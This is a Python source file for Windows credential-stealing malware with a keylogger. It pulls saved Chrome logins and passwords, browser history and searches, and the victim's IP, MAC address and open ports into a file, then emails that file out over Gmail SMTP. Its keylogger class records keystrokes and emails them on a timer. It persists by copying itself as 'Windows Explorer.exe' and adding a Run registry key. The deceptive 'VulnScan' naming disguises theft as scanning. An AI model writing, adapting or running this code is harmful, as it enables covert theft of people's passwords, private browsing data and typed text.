from pynput.keyboard import Key, Controller
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import time
import shutil
import smtplib
import subprocess
import platform
import getpass
import re
import os
import sqlite3
import requests
import urllib.parse
import threading

EMAIL = None # Set email here
EMAIL_PASSWORD = None # Set email password here
EMAIL_TO = None # leave this None if you want to send the email to yourself
SEND_EMAIL_EVERY = None # Send email every integer. 1 meaning 1 minute or 5 meaning 5 minutes


class Firefox:
	def __init__(self):
		pass

	def get_username(self):
		return getpass.getuser()

	def database_connection(self, data_base, select_from, time=None, *args):
		conn = sqlite3.connect(data_base)
		c = conn.cursor()

		try:
			if time:
				c.execute("SELECT datetime({}/1000000, 'unixepoch'), {} FROM {}".format(time, ", ".join(args), select_from))
			else:
				c.execute("SELECT {} FROM {}".format(", ".join(args), select_from))
		except sqlite3.OperationalError:
			print("Check error in database_connection")
		return c.fetchall()

	def gather_browsers(self, browser_location):
		browser_types = ["Mozilla Firefox", "Internet Explorer", "Google"]
		valid_browsers = []

		for root, dirs, files in os.walk(f"C:/{browser_location}"):
			for browser in dirs:
				if browser in browser_types:
					valid_browsers.append(browser)
		return valid_browsers

	def firefox_database_location(self, db):
		username = self.get_username()
		firefox_location = f"C:/Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/"

		for root, dirs, files in os.walk(firefox_location):
			for file in files:
				if file == db:
					return f"{root}/{file}"
		return None

	def firefox_places(self):
		places = self.firefox_database_location("places.sqlite")
		history_db = self.database_connection(places, "moz_places", "last_visit_date", "url")
		places_dict = {}

		for value in history_db:
			last_visit = value[0]
			url = value[1].strip()

			if "google" in url:
				search = re.findall(r"q=.*\&", url)

				if search:
					search = search[0].split("&")[0]
					search = search.replace("q=", "").replace("+", " ")
					places_dict[last_visit] = f"Searched: {search}"
					continue
			places_dict[last_visit] = url
		return places_dict

class Chrome(Firefox):
	def __init__(self):
		super().__init__()

	def chrome_file(self, file_name):
		username = self.get_username()
		chrome = r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\{}".format(username, file_name)

		if os.path.isfile(chrome):
			return chrome
		return None

	def chrome_login_data(self):
		location = self.chrome_file("Login Data")
		values = self.database_connection(location, "logins", None, "origin_url", "username_value", "password_value")
		login_data_dict = {}

		for value in values:
			url = value[0]
			username = value[1]
			password = value[2].decode("latin-1")

			if not username:
				username = "[-] Got no username"
			login_data_dict[url] = [username, password]
		return login_data_dict

	def chrome_history_data(self):
		location = self.chrome_file("History")
		url_dict = {}
		keywords = self.database_connection(location, "keyword_search_terms", None, "term")
		urls = self.database_connection(location, "urls", "last_visit_time", "url")
		
		keyword = [x[0] for x in set(keywords)]

		for letters in urls:
			url = urllib.parse.urlsplit(letters[1])[1]
			
			if url not in url_dict.values():
				url_dict[letters[0]] = url
		return url_dict, keywords

class VulnScan(Chrome):
	def __init__(self):
		super().__init__()
		self.username = self.get_username()
		self.FILE_NAME = f"C:/Users/{self.username}/Documents/data.txt"

	def write_to_file(self, item, item2=None, item3=None):
		with open(self.FILE_NAME, "a") as f:
			if item2 and not item3:
				f.write(f"{item}\t{item2}\n")
			elif item2 and item3:
				f.write(f"{item}\t{item2}\t{item3}\n")
			else:
				f.write(f"{item}\n")
			f.close()
		return

	def file_title(self, string, new_line, left=False, right=False):
		new_line_count = "\n" * new_line
		with open(self.FILE_NAME, "a") as f:
			if left and right:
				f.write(f"{new_line_count}{string}{new_line_count}")
			elif left:
				f.write(f"{new_line_count}{string}")
			elif right:
				f.write(f"{string}{new_line_count}")
			else:
				f.write(string)
			f.close()
		return

	def public_ip_address(self):
		return requests.get("http://icanhazip.com").content.decode()

	def get_platform(self):
		return platform.system()

	def mac_address(self):
		output = subprocess.check_output(["ipconfig", "/all"]).decode()
		return re.search("Physical Address.*", output).group(0).split(":")[1].strip()

	def windows_open_ports(self):
		ports = subprocess.check_output(["netstat", "-a"]).decode()
		listening_ports = []
		first_index = 0
		second_index = 4

		for words in ["Active", "Connections", "Proto", "Local Address", "Foreign Address", "State"]:
			ports = ports.replace(words, "")
		ports = ports.split()

		while True:
			if "LISTENING" in ports[first_index:second_index] and ports[second_index - 3].split(":")[1] not in listening_ports:
				ip = ports[second_index - 3].split(":")[1]

				if ip:
					listening_ports.append(ip)
				first_index += 4
				second_index += 4
				continue
			elif "ESTABLISHED" in ports[first_index:second_index]:
				first_index += 4
				second_index += 4
				continue
			break
		return listening_ports

	def for_loop_func(self, info, dict_item=None, unique=False, list_item=None, extra_item=None, no_key_value=None):
		self.file_title(info, new_line=2, right=True)
		star = "*" * 75

		if list_item and unique:
			list_item = set(list_item)

		if dict_item and not list_item:
			if isinstance(dict_item, dict):
				for key, value in dict_item.items():
					if no_key_value and ":" not in str(key):
						key = no_key_value
					if extra_item:
						username = value[0]
						self.write_to_file(extra_item, username, key)
					else:
						self.write_to_file(key, value)
			else:
				raise TypeError("Not a dictionary")

		elif list_item and not dict_item:
			if isinstance(list_item, list) or isinstance(list_item, set):
				for term in list_item:
					if not isinstance(term, str):
						term = term[0]
					self.write_to_file(term)
			else:
				raise TypeError("Invalid type. Must be a set or List")

		self.file_title(star, new_line=2, left=True, right=True)
		return

	def vuln_scanner(self):
		check_firefox = self.gather_browsers("Program Files")
		ports = self.windows_open_ports()
		star = "*" * 75

		mac_address = self.mac_address()
		platform = self.get_platform()
		public_ip = self.public_ip_address()

		victim_info = {
			"MAC ADDRESS:": mac_address,
			"Platform:": platform,
			"Username:": self.username,
			"IP address": public_ip
		}

		chrome_login_data = self.chrome_login_data()
		chrome_history_data, chrome_history_keyword_data = self.chrome_history_data()

		if check_firefox:
			places = self.firefox_places()
			self.for_loop_func("[+] Firefox places details", dict_item=places, no_key_value="[-] No time")
		
		self.for_loop_func("[+] Victim Windows Open Ports", list_item=ports)
		self.for_loop_func("[+] Victim Information", dict_item=victim_info)
		self.for_loop_func("[+] Chrome login Data", extra_item="[+] Username", dict_item=chrome_login_data)
		self.for_loop_func("[+] Chrome History Data", dict_item=chrome_history_data)
		self.for_loop_func("[+] Chrome Search History", list_item=chrome_history_keyword_data, unique=True)

	def vuln_scanner_email_report(self):
		self.vuln_scanner() # make the file
		message = MIMEMultipart()
		message.attach(MIMEText(open(self.FILE_NAME).read()))
		message = str(message)
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
		check = False

		try:
			server.login(EMAIL, EMAIL_PASSWORD)
			check = True
		except smtplib.SMTPAuthenticationError:
			print("\n[-] Email address or Password")

		if check:
			if EMAIL_TO:
				server.sendmail(EMAIL, EMAIL_TO, message)
			else:
				server.sendmail(EMAIL, EMAIL, message)
		os.remove(self.FILE_NAME)

class Keylogger(VulnScan):
	def __init__(self):
		super().__init__()
		self.log = ""

	def persistence(self):
		location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(location):
			shutil.copyfile(sys.executable, location)
			subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{}"'.format(location), shell=True)

	def on_press(self, key):
		try:
			self.log += str(key.char)
		except AttributeError:
			self.log += " "

	def report_logs(self):
		if not self.log:
			self.log = "[-] User did not type anything"
		self.send_email(self.log)
		self.log = ""
		threading.Timer(int(SEND_EMAIL_EVERY), self.report_logs).start()

	def send_email(self, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.ehlo()
		server.stattls()
		verify = False

		try:
			server.login(EMAIL, EMAIL_PASSWORD)
			verify = True
		except smtplib.SMTPAuthenticationError:
			print("[-] Invalid email")

		if verify:
			if EMAIL_TO:
				server.sendmail(EMAIL, EMAIL_TO, message)
			elif EMAIL and not EMAIL_TO:
				server.sendmail(EMAIL, EMAIL, message)
		return

if __name__ == '__main__':
	if not EMAIL or not EMAIL_PASSWORD or not SEND_EMAIL_EVERY:
		print("[-] Must set the Variables required to run program")
		exit()
	pass

	#VulnScan().vuln_scanner_email_report()
	#Keylogger()
